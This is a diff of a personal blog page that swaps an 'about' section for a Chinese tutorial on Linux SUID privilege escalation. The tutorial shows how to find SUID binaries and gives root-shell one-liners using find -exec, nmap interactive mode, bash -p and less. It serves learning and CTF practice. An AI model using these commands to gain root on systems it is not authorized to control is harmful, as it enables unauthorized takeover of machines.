@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>swedsn</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="swedsn">
+  <title>SUID提权.md | swedsn</title>
+  <meta name="keywords" content=" Web安全 ">
+  <meta name="description" content="SUID提权.md | swedsn">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
 <meta property="og:type" content="website">
@@ -56,7 +56,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -644,12 +644,62 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-SUID提权-md" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BF%99%E9%87%8C%E5%81%B7%E9%97%B2%EF%BC%8C%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB"><span class="toc-text">忙里偷闲，记录生活</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2"><span class="toc-text">关于博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%BD%9C%E8%80%85"><span class="toc-text">关于作者</span></a></li></ol></li></ol>
+        <h1 class="article-title">SUID提权.md</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web安全">Web安全</a> > 
+            
+            <a  data-rel="Web安全&lt;---&gt;SUID提权">SUID提权</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Web安全</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2022-09-19 21:04:00'>2022-09-19 21:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:685</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-text">前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFSUID"><span class="toc-text">1、什么是SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%90%9C%E7%B4%A2%E5%85%B7%E5%A4%87SUID%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-text">2、搜索具备SUID的程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">3、利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89find"><span class="toc-text">（1）find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Nmap"><span class="toc-text">（2）Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Vim"><span class="toc-text">（3）Vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89Bash"><span class="toc-text">（4）Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89more%E4%B8%8Eless"><span class="toc-text">（5）more与less</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">4、参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -662,28 +712,119 @@
     }
 </style>
 </div>
-            <h1 id="忙里偷闲，记录生活"><a href="#忙里偷闲，记录生活" class="headerlink" title="忙里偷闲，记录生活"></a>忙里偷闲，记录生活</h1><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>我认为搭建博客主要分为三个阶段</p>
-<blockquote>
-<p>第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感</p>
-</blockquote>
-<blockquote>
-<p>第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的</p>
-</blockquote>
-<blockquote>
-<p>第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便我查看笔记就行。此时看重的应该是博客本身里面的内容是否优越。并且此时的博客主要一应该是方便自己的使用，至于如果能通过我写的内容能为其他人解惑，当然会更好了</p>
-</blockquote>
-<blockquote>
-<p>本博客并没有使用SEO，如果能看到我的博客，说明你我有缘，希望我写的内容能帮助到你，望共勉！！！</p>
-</blockquote>
-<h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p>想要从事网络安全相关的内容， 目前主要学习web 以及二进制方面的内容</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般rce之后访问服务器的权限都是普通用户，要想获取管理员的权限就需要提权，而suid提权就是其中一种比较常见的提权方式，见过几次，这里浅研究一下</p>
+<h2 id="1、什么是SUID"><a href="#1、什么是SUID" class="headerlink" title="1、什么是SUID"></a>1、什么是SUID</h2><p>首先我们都知道Linux中 <code>/etc/shadow</code>中存放的是用户的账号密码，但是shadow这个目录所属为root，所以说其余用户没有修改的权限的。但是身为普通用户却能修改自己的账号密码，进而修改shadow当中的内容。 这个原因就是SUID<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220910164855571.png" alt="image-20220910164855571"></p>
+<p>SUID（set UID）是一种对二进制程序进行设置的特殊权限,可以让二进制程序的执行者临时拥有属主的权限。就是说当你执行passwd命令时，它就相当拥有root权限，此时就能修改shadow文件的里面。而二进制程序是否存在suid权限，看最前面是否存在-s参数</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220910142352472.png" alt="image-20220910142352472"></p>
+<p>而添加添加suid权限的方法为</p>
+<pre><code>chmod u+s 命令
+</code></pre>
+<h2 id="2、搜索具备SUID的程序"><a href="#2、搜索具备SUID的程序" class="headerlink" title="2、搜索具备SUID的程序"></a>2、搜索具备SUID的程序</h2><p>以下语句能搜索哪些具备SUID的程序</p>
+<pre><code class="bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<ul>
+<li>-perm：按照文件权限的类型进行查找，-u&#x3D;s，查找带有s权限的文件</li>
+<li>type f：按照文件来查找</li>
+<li>2&gt;&#x2F;dev&#x2F;null：把错误的输出到“黑洞”，就是不会显示到屏幕上</li>
+</ul>
+<pre><code class="bash">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;
+</code></pre>
+<ul>
+<li>-perm -4000，查看文件为4000（表示拥有suid权限）权限的文件</li>
+<li>-exec ls： 表示将查到的文件列出来，列出的方式是</li>
+<li>-ldb ：l表示以列表的形式，-d表示仅列出目录本身，而不列出目录内的文件数据</li>
+<li>{}：花括号代表前面find查找出来的文件名</li>
+</ul>
+<h2 id="3、利用方式"><a href="#3、利用方式" class="headerlink" title="3、利用方式"></a>3、利用方式</h2><p>常见的提权文件有：Nmap、Vim、find、Bash、More、less、Nano、cp、</p>
+<h3 id="（1）find"><a href="#（1）find" class="headerlink" title="（1）find"></a>（1）find</h3><p>因为find命令中有参数-exec，它能重新执行参数后面的命令，这样就可以以root的权限执行该命令</p>
+<pre><code class="bash">find /flag -exec whoami \;
+</code></pre>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220911213529314.png" alt="image-20220911213529314"></p>
+<pre><code>find /flag -exec /bin/bash -p \;
+</code></pre>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220911213700243.png" alt="image-20220911213700243"></p>
+<h3 id="（2）Nmap"><a href="#（2）Nmap" class="headerlink" title="（2）Nmap"></a>（2）Nmap</h3><p>nmap在早期的版本中，带有交互模式，允许用户执行shell命令</p>
+<p>使用如下命令进入nmap交互模式:</p>
+<pre><code class="bash">nmap --interactive
+</code></pre>
+<p>在nmap交互模式中 通过如下命令提权</p>
+<pre><code class="bash">nmap&gt; !sh
+</code></pre>
+<h3 id="（3）Vim"><a href="#（3）Vim" class="headerlink" title="（3）Vim"></a>（3）Vim</h3><p>vim如果具有suid权限，那么就可以之前读取文件内容了</p>
+<h3 id="（4）Bash"><a href="#（4）Bash" class="headerlink" title="（4）Bash"></a>（4）Bash</h3><p>bash -p直接进入root权限</p>
+<h3 id="（5）more与less"><a href="#（5）more与less" class="headerlink" title="（5）more与less"></a>（5）more与less</h3><p>more与less类似，利用命令进入shell</p>
+<pre><code>less /etc/passwd
+</code></pre>
+<p>#在less中输入:</p>
+<pre><code>!/bin/sh
+</code></pre>
+<p>z注意：使用more和less时一定要读取一个比较大的文件</p>
+<h2 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h2><p>1、<a target="_blank" rel="noopener" href="http://www.hackdig.com/05/hack-351745.htm">http://www.hackdig.com/05/hack-351745.htm</a></p>
+<p>2、<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39430198/article/details/123504153">https://blog.csdn.net/weixin_39430198/article/details/123504153</a></p>
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+<input type="hidden" id="MathJax-js"
+        value="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
+</input>
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -692,11 +833,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
